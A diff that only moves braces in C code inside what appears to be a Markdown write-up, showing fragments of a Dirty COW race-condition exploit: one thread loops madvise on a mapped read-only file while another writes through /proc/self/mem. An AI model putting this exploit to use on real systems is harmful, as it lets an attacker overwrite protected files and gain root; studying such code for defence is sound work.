@@ -132,16 +132,14 @@ pthread_t madvise_thr;
 struct stat st;
 char *target_content = TARGET_CONTENT;
 
-void *madvise_helper(void *vargp)
-{
+void *madvise_helper(void *vargp) {
   while(1) {
     /* free the no longer needed memory-mapped file memory section */
     madvise(memory_map, st.st_size, MADV_DONTNEED);
   }
 }
 
-void *write_helper(void *vargp)
-{
+void *write_helper(void *vargp) {
   /* open memory file descriptor in read-write mode */
   int file_desc = open("/proc/self/mem", O_RDWR);
   
@@ -155,8 +153,8 @@ void *write_helper(void *vargp)
 
 
 /* main function */
-int main()
-{
+int main() {
+
   /* open the file in read-only mode, and obtain the file descriptor */
   int file_desc = open(TARGET_FILENAME, O_RDONLY);
   /* get the file status, to learn the file size */
@@ -243,16 +241,14 @@ pthread_t madvise_thr;
 struct stat st;
 char *target_content = TARGET_CONTENT;
 
-void *madvise_helper(void *vargp)
-{
+void *madvise_helper(void *vargp) {
   while(1) {
     /* free the no longer needed memory-mapped file memory section */
     madvise(memory_map, st.st_size, MADV_DONTNEED);
   }
 }
 
-void *write_helper(void *vargp)
-{
+void *write_helper(void *vargp) {
   /* open memory file descriptor in read-write mode */
   int file_desc = open("/proc/self/mem", O_RDWR);
   
@@ -293,8 +289,8 @@ void *write_helper(void *vargp)
 
 ```c
 /* main function */
-int main()
-{
+int main() {
+  
   /* open the file in read-only mode, and obtain the file descriptor */
   int file_desc = open(TARGET_FILENAME, O_RDONLY);
   /* get the file status, to learn the file size */
